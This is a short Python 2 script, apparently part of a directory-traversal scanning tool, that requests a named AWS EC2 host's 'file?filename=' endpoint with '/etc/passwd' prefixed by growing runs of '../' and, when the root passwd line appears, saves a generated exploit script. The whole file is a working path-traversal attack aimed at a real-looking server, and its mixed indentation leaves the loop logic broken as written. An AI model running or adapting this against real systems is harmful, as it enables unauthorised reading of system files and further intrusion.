import requests
from generator import render, generator
from utility import *

banner(DT)

feeds = ['etc/passwd']
nuggets = ['root:x:0:0:root:/root:/bin/bash']
depth = 10

DT_generator = generator(DT)

method = 'GET'
hit = False

baseURLs = [
	'http://ec2-52-77-212-149.ap-southeast-1.compute.amazonaws.com:8082/file?filename='
]

for base in baseURLs:
	for feed in feeds:
		i = 0
		while i < depth and not hit:
		    if i == 0:
			value = '/' + feed
		    else:
			value = i * '../' + feed
			fullURL = base + value
			req = requests.get(fullURL)
			for nugget in nuggets:
			    if not hit and req.content.find(nugget) != -1:
				hit = True
				endpoint = fullURL
				scope, script = render[DT](endpoint,{},method)
				DT_generator.updateScope(scope)
				DT_generator.saveScript(script)                        
				success_message(fullURL)
		    i = i + 1

    
DT_generator.saveScope()

print '\n'
